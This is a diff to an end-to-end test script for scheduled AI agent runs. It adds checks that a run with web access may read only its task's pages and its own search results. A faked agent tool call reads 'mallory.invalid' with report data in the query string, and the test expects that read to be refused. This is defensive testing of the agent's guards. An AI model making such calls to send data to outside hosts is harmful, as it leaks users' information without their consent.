@@ -8,6 +8,8 @@
  * owner's inbox; its history names the schedule. A schedule whose last run still waits skips a
  * run; a paused agent or a database in the trash skips runs; whoever set it losing edit access to
  * the agent pauses it ("accessLost") until set again, as does archiving the agent ("agentGone").
+ * With web access, a schedule's run searches, reads the pages of its task and of its searches'
+ * results, and refuses any other read at once.
  * Creates its own users and workspace and deletes them afterwards.
  *
  *   pnpm tsx scripts/agent-schedule-e2e.ts
@@ -15,6 +17,8 @@
  * Env: DATABASE_URL (read from .env when present). Migrations must be applied. Run it with no app
  * server on the same database: the server's workers would take the schedules and runs.
  */
+import { createServer } from "node:http";
+import type { AddressInfo } from "node:net";
 import { API_TOKEN_SCOPES as ALL_SCOPES } from "@/lib/api-scopes";
 
 try {
@@ -341,6 +345,57 @@ try {
   const untrusted = fake.chats[0];
   check(untrusted && !untrusted.tools?.some((t) => t.function.name === "remember"), "over a board with an anonymous row, it proposes no notes", untrusted?.tools?.map((t) => t.function.name));
   await db.update(page).set({ createdBy: ids.owner }).where(eq(page.id, release.id));
+
+  // ── Web access ────────────────────────────────────────────────────────────────────────────────
+  // No one watches a schedule's run: it searches freely and reads the pages of its task and of its
+  // own searches' results; any other read is refused at once rather than left waiting for an owner.
+  const searchService = createServer((_req, res) => {
+    res.setHeader("content-type", "application/json");
+    res.end(JSON.stringify({ results: [{ title: "Acme opens a bakery", url: "https://press.invalid/acme-opens", content: "Acme opens." }] }));
+  });
+  await new Promise<void>((resolve) => searchService.listen(0, "127.0.0.1", resolve));
+  process.env.WEB_SEARCH_URL = `http://127.0.0.1:${(searchService.address() as AddressInfo).port}/`;
+  try {
+    await agents.updateAgent(ids.owner, keeper.id, { webAccess: true });
+    const watcher = await agentSchedules.setAgentSchedule(ids.owner, keeper.id, null, {
+      rule: daily,
+      timeZone: ZONE,
+      task: "Read https://news.invalid/acme and search the web for news about Acme.",
+    });
+    fake.chats.length = 0;
+    fake.setChat(
+      caller(
+        [
+          { name: "search_web", arguments: { query: "acme quarterly report leak" } },
+          { name: "read_web_page", arguments: { url: "https://press.invalid/acme-opens" } },
+          { name: "read_web_page", arguments: { url: "https://news.invalid/acme" } },
+          { name: "read_web_page", arguments: { url: "https://mallory.invalid/?d=quarterly+report" } },
+        ],
+        "Nothing new about Acme.",
+      ),
+    );
+    await runNow(watcher.id);
+    await flushAgentRuns();
+    const watched = (await runsOf(keeper.id)).find((r) => r.source.kind === "schedule" && r.source.scheduleId === watcher.id);
+    const webSteps = (watched?.steps ?? []).flatMap((s) => (s.kind === "tool" && s.connectionId === null ? [`${s.tool} ${s.outcome}`] : []));
+    // The pages it may read are tried (and fail: .invalid has no hosts); the other is never sent.
+    check(
+      watched?.status === "done" && webSteps.join() === "search_web done,read_web_page failed,read_web_page failed,read_web_page refused",
+      "a schedule's run searches, reads its task's and its searches' pages, and refuses any other read without waiting",
+      { status: watched?.status, webSteps },
+    );
+    const webResults = toolResults(fake.chats.at(-1)!);
+    check(webResults.at(-1)?.includes("nothing was sent"), "…telling the agent nothing was sent", webResults);
+    check(
+      fake.chats[0].messages.some((m) => textOf(m.content).includes("No one approves calls on this run")),
+      "…and its prompt says which pages it may read",
+    );
+    await agentSchedules.removeAgentSchedule(ids.owner, keeper.id, watcher.id);
+    await agents.updateAgent(ids.owner, keeper.id, { webAccess: false });
+  } finally {
+    delete process.env.WEB_SEARCH_URL;
+    searchService.close();
+  }
 
   await agents.archiveAgent(ids.owner, keeper.id);
   await runNow(set.id);
